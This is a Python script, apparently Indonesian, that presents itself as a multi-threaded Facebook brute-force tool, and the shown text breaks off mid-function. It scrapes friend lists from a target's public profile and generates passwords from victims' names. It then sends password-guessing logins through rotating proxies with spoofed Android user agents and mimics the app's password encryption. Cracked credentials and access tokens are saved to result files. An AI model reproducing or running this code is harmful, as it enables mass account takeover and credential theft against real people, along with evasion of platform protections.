#!/usr/bin/env python3
# -*- coding: utf-8 -*-

try:
    import os
    import requests
    import json
    import rich
    import time
    import datetime
    import re
    import random
    import uuid
    import sys
    import urllib.parse
    import base64
    import gzip
    import threading
    import hmac
    import hashlib
    import struct
    import io
    import binascii
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from Cryptodome import Random
    from Cryptodome.Cipher import AES, PKCS1_v1_5
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Random import get_random_bytes
except ImportError as ie:
    try:
        os.system('pip install {}'.format(ie.name))
    except Exception:
        print(str(ie))

from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
from urllib.parse import urlencode
from time import sleep
from string import ascii_letters
from rich.panel import Panel
from rich.console import Console
from rich import print as KenXinDev

day = datetime.now().strftime("%d-%m-%Y")
temp_dump = []
file_result = {
    'success': f'results/success-{day}.txt',
    'checkpoint': f'results/checkpoint-{day}.txt'
}

log = {
    'loop': 0,
    'success': 0,
    'checkpoint': 0
}

# Daftar proxy
proxies_list = []
proxies_lock = threading.Lock()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def Banner():
    clear_terminal()
    logo = r"""[bold red]●[bold yellow] ●[bold green] ●[/]
[bold red]            ________  _______  ______
           / ____/  |/  / __ )/ ____/
[bold white]          / /_  / /|_/ / __  / /_    
         / __/ / /  / / /_/ / __/    
        /_/   /_/  /_/_____/_/       
                             
        [underline bright_black]Multi-Threaded Facebook BruteForce Tool[/]
        [bold bright_black]Author: KenXinDev[/]"""
    KenXinDev(Panel(logo, width=80, style='bold bright_black'))

def KenXinInput():
    return Console().input("[bold bright_black]   ╰─> ")

def KenXin_Error(message: str):
    KenXinDev(f'[bold bright_black]   ──> [bold red]{message}', end='\r')
    return None

def KenXin_Warning(message: str):
    KenXinDev(f'[bold bright_black]   ──> [bold yellow]{message}', end='\r')
    return None

def create_folders():
    os.makedirs("results", exist_ok=True)
    os.makedirs("data", exist_ok=True)
    os.makedirs("temp", exist_ok=True)

# ==================== PROXY LOADER & VALIDATOR ====================
def validate_proxy(proxy):
    try:
        test_url = "http://httpbin.org/ip"
        proxies = {'http': proxy, 'https': proxy}
        r = requests.get(test_url, proxies=proxies, timeout=5)
        return r.status_code == 200
    except:
        return False

def getproxy(sock=False):
    data = []
    link = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all"
    protocol = "socks5" if sock is True else "socks4"
    try:
        resp = requests.get(link.format(protocol), stream=True, timeout=30)
        if resp.status_code == 200:
            for line in resp.iter_lines():
                if line:
                    data.append(line.decode().strip())
        return data
    except Exception as e:
        print(f"[!] Gagal mengambil proxy dari API: {e}")
        return []

def load_proxies():
    global proxies_list
    Banner()
    KenXinDev(Panel("[bold white]Gunakan proxy?\n[1] Ya (ambil dari API)\n[2] Ya (dari file socks4.txt)\n[3] Tidak (tanpa proxy)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Proxy Settings] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
    choice = KenXinInput()
    raw_proxies = []
    if choice == '1':
        KenXinDev("[bold yellow]Mengambil proxy dari API...[/]")
        raw_proxies = getproxy(False)
        if not raw_proxies:
            KenXin_Warning("API kosong, coba file local...")
            load_from_file()
            return
        raw_proxies = [f"socks4://{p}" for p in raw_proxies if ':' in p]
    elif choice == '2':
        proxy_file = "socks4.txt"
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line:
                        continue
                    ip, port = line.split(':', 1)
                    raw_proxies.append(f"http://{ip}:{port}")
            KenXinDev(f"[bold yellow]✓ {len(raw_proxies)} proxy dari file[/]")
        else:
            KenXin_Warning("File socks4.txt tidak ditemukan, tanpa proxy.")
            proxies_list.clear()
            return
    else:
        KenXinDev("[bold yellow]Berjalan tanpa proxy.[/]")
        proxies_list.clear()
        return

    if not raw_proxies:
        KenXin_Warning("Tidak ada proxy yang bisa digunakan.")
        proxies_list.clear()
        return

    KenXinDev(f"[bold yellow]Memvalidasi {len(raw_proxies)} proxy...[/]")
    valid = []
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(validate_proxy, p): p for p in raw_proxies}
        for future in as_completed(futures):
            proxy = futures[future]
            if future.result():
                valid.append(proxy)
    proxies_list = valid
    KenXinDev(f"[bold green]✓ {len(proxies_list)} proxy valid siap digunakan.[/]")
    if not proxies_list:
        KenXin_Warning("Tidak ada proxy valid, melanjutkan tanpa proxy.")

def get_random_proxy():
    with proxies_lock:
        if proxies_list:
            return random.choice(proxies_list)
    return None

def remove_proxy(proxy):
    with proxies_lock:
        if proxy in proxies_list:
            proxies_list.remove(proxy)

def load_from_file():
    global proxies_list
    proxy_file = "socks4.txt"
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                ip, port = line.split(':', 1)
                proxies_list.append(f"http://{ip}:{port}")
        KenXinDev(f"[bold green]✓ Loaded {len(proxies_list)} proxy dari {proxy_file}[/]")
    else:
        KenXin_Warning("File socks4.txt tidak ditemukan, berjalan tanpa proxy.")
        proxies_list.clear()

# ==================== ENKRIPSI PASSWORD (TETAP ADA, TAPI TIDAK DIPANGGIL DI SMARTLOCK) ====================
class Encrypt_PWD:
    def __init__(self):
        pass

    def PWD_FB4A(self, password, public_key=None, key_id="25"):
        if public_key is None:
            try:
                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
                pwd_key_fetch_data = {
                    'version': '2',
                    'flow': 'CONTROLLER_INITIALIZATION',
                    'method': 'GET',
                    'fb_api_req_friendly_name': 'pwdKeyFetch',
                    'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                    'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
                }
                response = requests.post(pwd_key_fetch, params=pwd_key_fetch_data).json()
                public_key = response.get('public_key')
                key_id = str(response.get('key_id', key_id))
            except Exception as e:
                return f"#PWD_FB4A:0:0:"
        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except Exception:
            return f"#PWD_FB4A:0:0:"

# ==================== CLASS LoginFacebook ====================
class LoginFacebook:
    def __init__(self):
        self.url = "https://adsmanager.facebook.com/adsmanager/onboarding"

    def login_cookie(self):
        try:
            self.cookie = open('data/cookie.txt', 'r', encoding='utf-8').read()
            self.token = open('data/token.txt', 'r', encoding='utf-8').read()
        except FileNotFoundError:
            Banner()
            KenXinDev(Panel("[bold white]Masukan cookie facebook anda, pastikan anda menggunakan akun tumbal jangan menggunakan akun pribadi", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Required] <<[/]", subtitle="[bold bright_black]╭──────", subtitle_align="left"))
            coki = KenXinInput()
            if not coki:
                KenXin_Error("Invalid Cookie!!")
                sleep(3)
                self.login_cookie()
            try:
                with requests.Session() as session:
                    session.cookies.set('cookie', coki)
                    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"})
                    response = session.get(self.url)
                    response.raise_for_status()
                    act = re.search(r'act=(\d+)', response.text).group(1)
                    if not act:
                        KenXin_Error("Invalid Cookie!!")
                        sleep(3)
                        self.login_cookie()
                    access_token = self.getToken(session, act)
                    with open("data/cookie.txt", "w", encoding="utf-8") as f:
                        f.write(coki)
                    with open("data/token.txt", "w", encoding="utf-8") as f:
                        f.write(access_token)
                    KenXinDev(Panel("[bold green]Login berhasil, silahkan jalankan ulang tools[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Successful] <<[/]"))
                    sleep(3)
                    sys.exit()
            except Exception as e:
                KenXin_Error("Error: " + str(e).title())
        nama, uid = self.checkCookie(self.cookie, self.token)
        Facebook(self.cookie, self.token, nama, uid).menu()

    def checkCookie(self, cookie, token):
        try:
            with requests.Session() as s:
                s.cookies.set("cookie", cookie)
                s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"})
                response = s.get(
                    'https://graph.facebook.com/me?fields=name,id&access_token={}'.format(token)
                )
                if response.status_code == 200:
                    data = response.json()
                    if 'name' in data and 'id' in data:
                        return data['name'], data['id']
                    else:
                        KenXin_Error("Cookie tidak valid!")
                        sleep(3)
                        os.remove("data/cookie.txt")
                        os.remove("data/token.txt")
                        self.login_cookie()
                else:
                    KenXin_Error("Gagal memeriksa cookie, pastikan cookie dan token valid!")
                    sleep(3)
                    os.remove("data/cookie.txt")
                    os.remove("data/token.txt")
                    self.login_cookie()
        except Exception as e:
            KenXin_Error("Error: " + str(e).title())
            sys.exit()

    def getToken(self, session, act):
        try:
            params = {
                'act': act,
                'breakdown_regrouping': '1',
                'nav_source': 'no_referrer'
            }
            response = session.get(self.url, params=params)
            token = re.search(r'__accessToken\s*=\s*"([^"]+)"', response.text).group(1)
            if not token:
                KenXin_Warning("Akses token tidak ditemukan")
                sys.exit()
            return token
        except Exception as e:
            KenXin_Error("Error: " + str(e).title())
            sys.exit()

# ==================== CLASS Facebook ====================
class Facebook:
    def __init__(self, cookie, token, nama, uid):
        self.cookie = cookie
        self.token = token
        self.nama = nama
        self.idz = uid
        self.enc = Encrypt_PWD()  # class enkripsi tetap ada

    # ---------- Random User-Agent Generator ----------
    def generate_facebook_user_agent(self) -> tuple:
        android_devices = [
            {"model": "Redmi Note 12", "build": "SKQ1.211006.001", "brand": "Xiaomi"},
            {"model": "Redmi Note 11", "build": "SKQ1.211006.001", "brand": "Xiaomi"},
            {"model": "2201116SG", "build": "SP1A.210812.016", "brand": "Xiaomi"},
            {"model": "22071212AG", "build": "SP1A.210812.016", "brand": "Xiaomi"},
            {"model": "M2007J20CG", "build": "QKQ1.200830.002", "brand": "Xiaomi"},
            {"model": "220233L2G", "build": "SP1A.210812.016", "brand": "Xiaomi"},
            {"model": "CPH2207", "build": "RP1A.200720.011", "brand": "OPPO"},
            {"model": "CPH2359", "build": "SP1A.210812.016", "brand": "OPPO"},
            {"model": "CPH2145", "build": "RP1A.200720.011", "brand": "OPPO"},
            {"model": "CPH1937", "build": "QP1A.190711.020", "brand": "OPPO"},
        ]
        app_versions = [
            "460.0.0.70.120", "459.1.0.68.115", "458.2.0.66.110",
            "457.0.0.64.120", "456.1.0.67.111", "455.2.0.62.105",
        ]
        chosen_locale = "id_ID"
        device = random.choice(android_devices)
        android_ver = f"{random.randint(7, 13)}.{random.randint(0, 1)}"
        density = round(random.uniform(1.0, 4.0), 1)
        width = random.choice([720, 1080, 1440])
        height = random.choice([1280, 1920, 2340, 2400, 2560])

        ua = (
            f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; "
            f"{device['model']} Build/{device['build']}) "
            f"[FBAN/FB4A;FBAV/{random.choice(app_versions)};"
            f"FBBV/{random.randint(400000000, 500000000)};"
            f"FBDM/{{density={density},width={width},height={height}}};"
            f"FBLC/{chosen_locale};"
            f"FBRV/0;FBCR/;FBMF/{device['brand']};FBBD/{device['brand']};"
            f"FBPN/com.facebook.katana;"
            f"FBDV/{device['model']};FBSV/{android_ver};"
            f"FBOP/1;FBCA/x86:armeabi-v7a;]"
        )
        return ua, chosen_locale

    def logo(self):
        Banner()
        KenXinDev(Panel(f"[bold white]Name: [bold red]{self.nama}[/bold red]\nUid: [bold red]{self.idz}[/bold red]\nAccessToken: [bold red]{self.token[:20]}***[/]", style="bold bright_black", title="[bold bright_black]>> [Account Info] <<[/]", width=80))
        KenXinDev(Panel("[bold white][01] Dump id publik\n[02] Crack dari file dump (userid<=>fullname)\n[03] Check result crack\n[04] Crack dari file user|pass\n[00] Logout[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Tools Menu] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))

    def menu(self):
        self.logo()
        choose = KenXinInput()
        if not choose:
            KenXin_Error("Wrong Input")
            sleep(3)
            self.menu()
        elif choose in ('1', '01'):
            self.dumpId_public()
        elif choose in ('2', '02'):
            self.crack_from_dump_file()
        elif choose in ('3', '03'):
            self.check_results()
        elif choose in ('4', '04'):
            self.crack_from_file_pass()
        elif choose in ('0', '00'):
            if os.path.exists('data/token.txt'):
                os.remove('data/token.txt')
            if os.path.exists('data/cookie.txt'):
                os.remove('data/cookie.txt')
            sys.exit()
        else:
            KenXin_Error("Wrong Input")
            sleep(3)
            self.menu()

    # ==================== MENU 1: DUMP ID PUBLIK ====================
    def dumpId_public(self, after=''):
        try:
            KenXinDev(Panel("[bold white]Masukan id target, pastikan pertemanan target bersifat publik dan memiliki teman[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Dump User] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
            targetId = KenXinInput()
            if not targetId:
                KenXin_Warning("Target jangan kosong!")
                sleep(3)
                self.dumpId_public(after)
            with requests.Session() as s:
                s.cookies.set("cookie", self.cookie)
                s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"})
                while True:
                    params = {
                        "after": after,
                        "pretty": 1,
                        "access_token": self.token,
                        "limit": ""
                    }
                    try:
                        response = s.get('https://graph.facebook.com/v16.0/{}/friends'.format(targetId), params=params).json()
                        for user in response['data']:
                            userid = user.get('id')
                            fullname = user.get('name')
                            temp_dump.append(f"{userid}<=>{fullname}\n")
                            open(f'temp/dump-{targetId}.txt', 'a', encoding='utf-8').write(f"{userid}<=>{fullname}\n")
                        KenXinDev(f"[bold white]# berhasil mengumpulkan {len(temp_dump)} user...[/]", end='\r')
                        cursors = response.get('paging', {}).get('cursors', {})
                        if 'after' in cursors:
                            after = cursors['after']
                        else:
                            break
                    except KeyboardInterrupt:
                        KenXin_Warning("Proses dihentikan oleh pengguna!")
                        break
                    except Exception as e:
                        KenXin_Error("Error: " + str(e).title())
                        break
                self.settings()
        except Exception as e:
            KenXin_Error("Error: " + str(e).title())

    # ==================== MENU 2: CRACK DARI FILE DUMP ====================
    def crack_from_dump_file(self):
        KenXinDev(Panel("[bold white]Crack dari file dump (format: userid<=>fullname)\n[1] Pilih dari file dump yang tersimpan di folder temp\n[2] Masukkan path file manual[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Crack Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
        pilihan = KenXinInput()
        if pilihan == '1':
            temp_files = [f for f in os.listdir("temp") if f.startswith("dump-") and f.endswith(".txt")]
            if not temp_files:
                KenXin_Warning("Tidak ada file dump di folder temp!")
                sleep(2)
                self.menu()
                return
            KenXinDev(Panel("[bold white]Pilih file dump yang ingin digunakan:[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Select Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
            for idx, f in enumerate(temp_files, start=1):
                KenXinDev(f"[bold white]{idx}. {f}[/]")
            KenXinDev("[bold white]0. Kembali ke menu[/]")
            choice = KenXinInput()
            if choice == '0':
                self.menu()
                return
            try:
                idx = int(choice) - 1
                if idx < 0 or idx >= len(temp_files):
                    KenXin_Warning("Pilihan tidak valid!")
                    sleep(2)
                    self.crack_from_dump_file()
                    return
                selected_file = temp_files[idx]
                file_path = os.path.join("temp", selected_file)
            except ValueError:
                KenXin_Warning("Input harus angka!")
                sleep(2)
                self.crack_from_dump_file()
                return
        elif pilihan == '2':
            KenXinDev(Panel("[bold white]Masukkan path file dump (contoh: temp/dump-123456.txt)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Manual File Path] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
            file_path = KenXinInput()
            if not file_path:
                KenXin_Warning("Path file tidak boleh kosong!")
                sleep(2)
                self.crack_from_dump_file()
                return
            if not os.path.exists(file_path):
                KenXin_Warning(f"File '{file_path}' tidak ditemukan!")
                sleep(2)
                self.crack_from_dump_file()
                return
        else:
            KenXin_Warning("Pilihan tidak valid!")
            sleep(2)
            self.crack_from_dump_file()
            return

        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if '<=>' in line:
                        userid, fullname = line.split('<=>', 1)
                        accounts.append((userid.strip(), fullname.strip()))
                    else:
                        KenXin_Warning(f"Format baris tidak dikenali (harus userid<=>fullname): {line}")
        except Exception as e:
            KenXin_Error(f"Gagal membaca file: {e}")
            sleep(2)
            self.menu()
            return

        if not accounts:
            KenXin_Warning("File dump kosong atau format salah!")
            sleep(2)
            self.menu()
            return

        KenXinDev(f"[bold green]✓ {len(accounts)} akun berhasil dimuat dari file dump.[/]")
        sleep(1)
        global temp_dump
        temp_dump = [f"{uid}<=>{nama}" for uid, nama in accounts]
        self.settings()

    # ==================== MENU 4: CRACK DARI FILE USER|PASS ====================
    def crack_from_file_pass(self):
        KenXinDev(Panel("[bold white]Masukkan path file akun (format: user|password per baris)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Load File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
        file_path = KenXinInput()
        if not file_path:
            KenXin_Warning("File path tidak boleh kosong!")
            sleep(2)
            self.menu()
            return

        if not os.path.exists(file_path):
            KenXin_Warning(f"File '{file_path}' tidak ditemukan!")
            sleep(2)
            self.menu()
            return

        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '|' not in line:
                        KenXin_Warning(f"Format baris tidak valid (harus user|pass): {line}")
                        continue
                    user, pwd = line.split('|', 1)
                    accounts.append((user.strip(), pwd.strip()))
        except Exception as e:
            KenXin_Error(f"Gagal membaca file: {e}")
            sleep(2)
            self.menu()
            return

        if not accounts:
            KenXin_Warning("Tidak ada akun valid di file!")
            sleep(2)
            self.menu()
            return

        KenXinDev(f"[bold green]✓ {len(accounts)} akun berhasil dimuat.[/]")
        sleep(1)
        self.settings(accounts)

    # ==================== MENU 3: CHECK RESULT CRACK ====================
    def check_results(self):
        Banner()
        success_file = file_result['success']
        checkpoint_file = file_result['checkpoint']

        def count_lines(file_path, has_header=True):
            if not os.path.exists(file_path):
                return 0
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                count = len(lines)
                if has_header and count > 0:
                    if lines[0].startswith('#'):
                        count -= 1
                return count
            except:
                return 0

        success_count = count_lines(success_file, has_header=True)
        checkpoint_count = count_lines(checkpoint_file, has_header=False)

        info = f"""[bold white]📊 Statistik Hasil Crack[/bold white]
[bold green]✅ Sukses       : {success_count}[/bold green]
[bold yellow]⚠️  Checkpoint   : {checkpoint_count}[/bold yellow]
[bold bright_black]📁 File Sukses    : {success_file}
📁 File Checkpoint : {checkpoint_file}[/bold bright_black]"""

        KenXinDev(Panel(info, width=80, style='bold bright_black', title='[bold bright_black]>> [Result Info] <<[/]'))
        KenXinDev("[bold white]Tekan Enter untuk kembali ke menu...[/]")
        input()
        self.menu()

    # ==================== SETTINGS DAN EKSEKUSI ====================
    def settings(self, accounts=None):
        print()
        KenXinDev(Panel('''[bold white]01. Nama 1-4            02. Nama 1-5
03. Nama 1-6            04. Nama 1-6 + Kombinasi manual
05. Manual Password     00. Back to Menu[/]''', style='bold bright_black', width=80, title='[bold bright_black]>> [Password Settings] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
        kombinasi = KenXinInput()
        if kombinasi in ('01','1'):
            self.exec_method(kombinasi, accounts=accounts)
        elif kombinasi in ('02','2'):
            self.exec_method(kombinasi, accounts=accounts)
        elif kombinasi in ('03','3'):
            self.exec_method(kombinasi, accounts=accounts)
        elif kombinasi in ('04','4'):
            KenXinDev(Panel('[bold white]Masukan password kombinasi manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]',style='bold bright_black', width=80, title='[bold bright_black]>> [Kombinasi Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXinInput()
            if not manual_password:
                KenXin_Warning('Password manual harus diisi!!')
                sleep(3)
                self.settings(accounts)
            self.exec_method(kombinasi, manual_password, accounts)
        elif kombinasi in ('05','5'):
            KenXinDev(Panel('[bold white]Masukan password manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Manual Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
            manual_password = KenXinInput()
            if not manual_password:
                KenXin_Warning('Password manual harus diisi!!')
                sleep(3)
                self.settings(accounts)
            self.exec_method(kombinasi, manual_password, accounts)
        elif kombinasi in ('00','0'):
            self.menu()
        else:
            KenXin_Warning('Wrong Input!!')
            time.sleep(3)
            self.settings(accounts)

    def exec_method(self, c, zx='', accounts=None):
        list_accounts = accounts if accounts is not None else temp_dump
        if not list_accounts:
            KenXin_Warning("Tidak ada akun untuk diproses!")
            sleep(2)
            self.menu()
            return

        with ThreadPoolExecutor(max_workers=30) as shinkai:
            for item in list_accounts:
                try:
                    if isinstance(item, str):
                        if item.count('<=>') != 1:
                            raise ValueError(f"Format tidak valid: {item}")
                        username, fullname = item.split('<=>')
                        passwords = self.generate_passwords(fullname, c, zx)
                    else:
                        username, password = item
                        passwords = [password]
                    shinkai.submit(self.smartlock_login, username, passwords)
                except Exception as e:
                    KenXin_Error(f'Terjadi error: {str(e)}')
                    time.sleep(3)
        print()
        KenXinDev(Panel('[bold white]Crack telah selesai dengan hasil ok dan cp : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(log["success"], log['checkpoint']), width=80, style='bold bright_black', title='[bold bright_black]>> [Facebook Info] <<[/]'))
        time.sleep(3)
        sys.exit()

    # ==================== GENERATE PASSWORD ====================
    def generate_passwords(self, name, kombinasi, zx=''):
        suffix_list = []
        if kombinasi in ['1', '01']:
            suffix_list = ['123', '1234', '321', '01', '02']
        elif kombinasi in ['2', '02']:
            suffix_list = ['123', '1234', '12345', '321', '01', '02']
        elif kombinasi in ['3', '03']:
            suffix_list = ['123', '1234', '12345', '321', '123456', '01', '02']
        elif kombinasi in ['4', '04']:
            suffix_list = ['123', '1234', '12345', '321', '123456', '01', '02']
            if zx:
                suffix_list.extend([s.strip() for s in zx.split(',') if s.strip()])
        elif kombinasi in ['5', '05']:
            suffix_list = [s.strip() for s in zx.split(',') if s.strip()] if zx else []

        fullname = name.lower().strip()
        parts = [p for p in fullname.split() if p]
        passwords = []

        def add_suffix(base):
            candidates = [base]
            for s in suffix_list:
                candidates.append(base + s)
            for candidate in candidates:
                if len(candidate) >= 6 and candidate not in passwords:
                    passwords.append(candidate)

        if len(parts) == 1:
            base = parts[0]
            add_suffix(base)
        elif len(parts) == 2:
            for part in parts:
                if len(part) >= 6:
                    passwords.append(part)
                add_suffix(part)
            combined = parts[0] + parts[1]
            if len(combined) >= 6:
                passwords.append(combined)
            add_suffix(combined)
        else:
            parts = parts[:3]
            for part in parts:
                if len(part) >= 6:
                    passwords.append(part)
                add_suffix(part)
            combinations_2 = [
                parts[0] + parts[1],
                parts[0] + parts[2],
                parts[1] + parts[2]
            ]
            for combo in combinations_2:
                if len(combo) >= 6:
                    passwords.append(combo)
                add_suffix(combo)
            combined_all = parts[0] + parts[1] + parts[2]
            if len(combined_all) >= 6:
                passwords.append(combined_all)
            add_suffix(combined_all)

        return passwords

    # ==================== METODE SMARTLOCK (PLAIN PASSWORD, RANDOM UA) ====================
    def smartlock_login(self, user, passwords):
        global log
        KenXinDev(f'[bold bright_black]   ──> [bold white]Crack {user[:8]}/{len(temp_dump)}/[bold green]{log["success"]}[/bold green]/[bold yellow]{log["checkpoint"]}[/bold yellow]/{log["loop"]}[/]', end='\r')

        for pwd in passwords:
            for attempt in range(3):
                proxy = get_random_proxy()
                try:
                    # Enkripsi password
                    encrypted_pass = self.enc.PWD_FB4A(pwd)

                    # Random user-agent & locale
                    ua_str, loc = self.generate_facebook_user_agent()

                    curl = requests.Session()
                    if proxy:
                        curl.proxies = {'http': proxy, 'https': proxy}

                    curl.headers.update({
                        'Host': 'b-graph.facebook.com',
                        'Authorization': 'OAuth 121876164619130|1ab2c5c902faedd339c14b2d58e929dc',
                        'x-fb-request-analytics-tags': '{"network_tags":{"product":"121876164619130","purpose":"none","retry_attempt":"0"},"application_tags":"graphservice"}',
                        'x-fb-connection-type': 'dummy',
                        'app-scope-id-header': 'd2c663d1-ed7c-471d-bd58-f4a78f1d3acc',
                        'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                        'x-zero-f-device-id': 'd188a6c7-b574-4395-93dc-242870addd73',
                        'x-zero-state': 'unknown',
                        'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-graphql-client-library': 'graphservice',
                        'x-tigon-is-retry': 'False',
                        'x-fb-http-engine': 'Tigon/Liger',
                        'x-fb-client-ip': 'True',
                        'x-fb-server-cluster': 'True',
                        'x-fb-conn-uuid-client': '4ZGi+CQFuIQjbQ3okjarGQ==',
                        'user-agent': ua_str,
                        'Accept-Encoding': 'gzip, deflate',
                    })

                    data = {
                        'method': 'post',
                        'pretty': 'false',
                        'format': 'json',
                        'server_timestamps': 'true',
                        'locale': loc,
                        'purpose': 'fetch',
                        'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                        'fb_api_caller_class': 'graphservice',
                        'client_doc_id': '11994080425603935587861051615',
                        'variables': json.dumps({
                            'params': {
                                'params': json.dumps({
                                    'server_params': {
                                        'family_device_id': str(uuid.uuid4()),
                                        'device_id': str(uuid.uuid4()),
                                        'machine_id': '',
                                        'from_native_screen': True,
                                        'contact_point': user,
                                        'encrypted_password': encrypted_pass
                                    }
                                }),
                                'bloks_versioning_id': '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720',
                                'app_id': 'com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request'
                            },
                            'scale': '1.5',
                            'nt_context': {
                                'using_white_navbar': True,
                                'styles_id': '790c12baa860bb932decc340a5291740',
                                'pixel_ratio': 1.5,
                                'is_push_on': True,
                                'debug_tooling_metadata_token': None,
                                'is_flipper_enabled': False,
                                'theme_params': [],
                                'bloks_version': '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720'
                            }
                        }),
                        'fb_api_analytics_tags': '["GraphServices"]',
                        'client_trace_id': str(uuid.uuid4())
                    }

                    response = curl.post(
                        "https://b-graph.facebook.com/graphql",
                        data=data,
                        timeout=25
                    ).json()

                    # # ---------- CEK RATE LIMIT ----------
                    # if 'errors' in response:
                    #     for err in response['errors']:
                    #         if 'Anda Diblokir Sementara' in err.get('summary', ''):
                    #             KenXin_Warning("Anda Diblokir Sementara. Mode pesawat 5 detik...")
                    #             time.sleep(3)
                    #             # Langsung keluar dari loop attempt -> lanjut ke password berikutnya
                    #             break
                    #     # Jika break terjadi (rate limit), maka keluar dari for attempt
                    #     else:
                    #         # Jika tidak ada rate limit tapi ada error lain, kita lanjutkan saja (anggap gagal)
                    #         pass
                    #     # Setelah penanganan error, langsung lanjut ke password berikutnya (tanpa eksekusi kode di bawah)
                    #     break   # ini break untuk for attempt, akan keluar dan melanjutkan ke pwd berikutnya

                    # ---------- PROSES RESPONS NORMAL ----------
                    if response.get('data') and response['data'].get('fb_bloks_action') and response['data']['fb_bloks_action'].get('root_action'):
                        server_respon1 = response['data']['fb_bloks_action']['root_action']['action']['action_bundle']['bloks_bundle_action']
                        server_respon2 = server_respon1.replace('\\', '')
                        if 'session_key' in server_respon2 or 'EAAAAU' in server_respon2:
                            log['success'] += 1
                            # cookie = "; ".join(["{}={}".format(k, v) for k, v in curl.cookies.get_dict().items()])
                            token = re.search(r'"access_token":"([^"]+)"', server_respon2).group(1)
                            KenXinDev(Panel(Panel(f"[bold green][+] Username : {user}\n[+] Password : {pwd}\n[+] Access Token : {token}\n[+] User Agent : {ua_str}[/bold green]", style='bold green'), width=80, style='bold bright_black', title='[bold green]Login-Success[/bold green]'))
                            open(file_result["success"], 'a', encoding='utf-8').write(f"{user}|{pwd}|{token}\n")
                            return   # sukses, keluar dari fungsi
                        elif 'redirect_login_challenges' in server_respon2 or 'com.bloks.www.ap.two_step_verification.entrypoint_async' in server_respon2:
                            log['checkpoint'] += 1
                            KenXinDev(Panel(Panel(f"[bold yellow][+] Username : {user}\n[+] Password : {pwd}\n[+] User Agent : {ua_str}[/bold yellow]", style='bold yellow'), width=80, style='bold bright_black', title='[bold yellow]Login-Checkpoint[/bold yellow]'))
                            open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}|{ua_str}\n")
                            return   # checkpoint juga keluar
                        else:
                            # password salah
